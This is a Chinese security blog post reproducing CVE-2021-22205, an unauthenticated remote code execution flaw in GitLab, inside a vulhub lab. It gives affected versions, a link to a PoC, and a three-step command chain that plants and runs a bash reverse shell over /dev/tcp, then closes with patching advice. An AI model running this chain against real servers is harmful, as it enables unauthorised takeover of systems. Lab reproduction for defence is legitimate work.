# 【漏洞复现】CVE-2021-22205 GitLab 未授权 RCE - Adminxe - 博客园

> 原文：[`www.cnblogs.com/cn-gov/p/15490588.html`](https://www.cnblogs.com/cn-gov/p/15490588.html)

![](img/635e6a88977dba667aec562759672723.png)

### 0x00 漏洞简介：

漏洞出来第一时间，听漏洞浍测的朋友传来的情报，就及时给了 POC，但一直没复现，只是简单看了文章，提到需要可以注册用户才能进行攻击，然后就感觉挺鸡肋，没有再继续看。

恰巧**好基友涛子**给我发来他复现的文章，看了看 exp，感觉并没那么鸡肋，相反可以通过未授权进行权限的获取，正好自己也复现了一手，同时借用涛子的文章给大家展现了出来。

GitLab 是一个用于仓库管理系统的开源项目，使用 Git 作为代码管理工具，并在此基础上搭建起来的 Web 服务。

GitLab 是一款 Ruby 开发的 Git 项目管理平台。如 11.9 以后的 GitLab 中，因为使用了图片处理工具 ExifTool 而受到漏洞[CVE-2021-22204](https://devcraft.io/2021/05/04/exiftool-arbitrary-code-execution-cve-2021-22204.html)的影响，攻击者可以通过一个未授权的接口上传一张恶意构造的图片，进而在 GitLab 服务器上执

参考链接：

*   [`hackerone.com/reports/1154542`](https://hackerone.com/reports/1154542)
*   [`devcraft.io/2021/05/04/exiftool-arbitrary-code-execution-cve-2021-22204.html`](https://devcraft.io/2021/05/04/exiftool-arbitrary-code-execution-cve-2021-22204.html)
*   [`security.humanativaspa.it/gitlab-ce-cve-2021-22205-in-the-wild/`](https://security.humanativaspa.it/gitlab-ce-cve-2021-22205-in-the-wild/)
*   [`github.com/projectdiscovery/nuclei-templates/blob/master/cves/2021/CVE-2021-22205.yaml`](https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2021/CVE-2021-22205.yaml)
*   [`github.com/vulhub/vulhub/blob/master/gitlab/CVE-2021-22205/README.zh-cn.md`](https://github.com/vulhub/vulhub/blob/master/gitlab/CVE-2021-22205/README.zh-cn.md)

### 0x01 影响版本：

```
该漏洞影响以下 GitLab 企业版和社区版：11.9 <= GitLab（CE/EE）< 13.8.813.9 <= GitLab（CE/EE）< 13.9.613.10 <=GitLab（CE/EE）< 13.10.3 本文复现版本：Gitlab CE 13.10.1
```

### 0x02 漏洞环境

建议内存>8

执行如下命令启动一个 GitLab 13.10.1 版本服务器：

```
git clone https://github.com/vulhub/vulhub.gitcd vulhub/gitlab/CVE-2021-22205/docker-compose up -d 环境启动后，访问 http://your-ip:8080 即可查看到 GitLab 的登录页面。

```

![](img/156b64acd388c118d3f5db954b16f74f.png)

### 0x03 漏洞复现

#### 漏洞 POC

https://github.com/Al1ex/CVE-2021-22205

#### 漏洞验证

`python CVE-2021-22205.py -v true -t http://Your IP:Port`

![](img/ca828029066a825c0ba8a0cc421ed068.png)

**命令执行：**

![](img/c762d6aeb50d634ad0659be34a77649b.png)![](img/302449888900baaff7e801734082aa5b.png)

```
反弹 shell：

python3 CVE-2021-2205.py -a true -t http://Your IP:port -c "echo 'bash -i >& /dev/tcp/ip/port 0>&1' > /tmp/1.sh"
这条语句意思是代表，将反弹 shell 命令写成 sh 脚本 到 tmp 目录下
python3 CVE-2021-2205.py -a true -t http://Your IP:port -c "chmod +x /tmp/1.sh"
这条语句意思是代表，对写入成功的 sh 脚本加执行权限
python3 CVE-2021-2205.py -a true -t http://Your IP:port -c "/bin/bash /tmp/1.sh"
这条语句意思是代表，运行反弹 shell 脚本
```

![](img/d398a141d9546e16a3c70cb5a2641f9b.png)![](img/5d57cf10c224aa1dbe6d9ad000bb35d9.png)![](img/0c6850b7b461d4c3076211ed33eda2e4.png)![](img/f640e10d72ddf6b412750e39583d14b9.png)![](img/fdbbba80a3be3ce7930550d54a8668bc.png)![](img/e3e2eaa60af0168c66d946dc1a457056.png)

### 0x04 修复方案

1、及时升级 GitLab 至最新安全版本

2、配置访问控制策略，避免受影响的 GitLab 暴露在公网

转载请注明：[Adminxe's Blog](https://www.adminxe.com/) » [【漏洞复现】CVE-2021-22205 GitLab 未授权 RCE](https://www.adminxe.com/2806.html)